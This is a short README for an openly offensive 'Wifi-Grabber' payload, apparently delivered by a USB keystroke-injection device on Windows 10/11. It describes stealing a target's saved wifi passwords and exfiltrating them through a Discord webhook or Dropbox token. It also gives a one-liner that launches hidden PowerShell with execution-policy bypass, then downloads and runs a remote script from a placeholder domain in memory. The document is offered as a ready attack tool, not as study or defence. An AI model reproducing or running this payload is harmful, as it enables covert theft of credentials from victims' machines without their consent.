##

<!-- TABLE OF CONTENTS -->
<!--TABLE 0F C0NTENTS-->

# Wifi-Grabber

## Description

This payload grabs your target's wifi passwords and uploads them to either Dropbox, Discord, or both.

## Getting Started

### Dependencies

* Windows 10,11

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory

`$dc` is the variable that stores your Discord webhook 

`$db` is the variable that stores your Dropbox token 

Fill in either or both of these to methods to exfil your collected data

```
powershell -w h -NoP -Ep Bypass $dc='';$db='';irm MYDOMAIN.HERE/e8v | iex
```

##

##